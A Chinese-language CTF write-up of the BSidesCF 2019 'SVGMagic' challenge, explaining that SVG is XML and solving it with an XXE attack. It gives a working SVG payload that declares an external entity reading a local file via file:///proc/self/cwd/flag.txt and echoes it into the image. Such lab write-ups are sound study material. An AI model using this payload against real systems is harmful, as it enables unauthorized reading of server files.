---
title: '[BSidesCF 2019]SVGMagic'
date: 2024-07-25 18:48:57
tags: xxe
categories: 刷题笔记
---

## [BSidesCF 2019]SVGMagic(xxe)

SVG是一种用XML定义的语言，SVG图形是可交互的和动态的，可以在SVG文件中嵌入动画元素或通过脚本来定义动画。

也就是说SVG是个XML，我们就能想到xxe

详解：https://www.freebuf.com/vuls/175451.html

我们知道，XML被设计用于传输和存储数据，然后这个漏洞就是利用了，应用程序在解析XML输入时，没有禁止外部实体的加载。
就拿下面的这个来说

<!--more-->

```
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
```

这个就是外部实体，加载了flag.txt,然后输出，也就是：应该是实体引用，把加载的东西放出来

```
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```

payload

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>

```

得到flag

![image-20240725185654902](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407251856981.png)
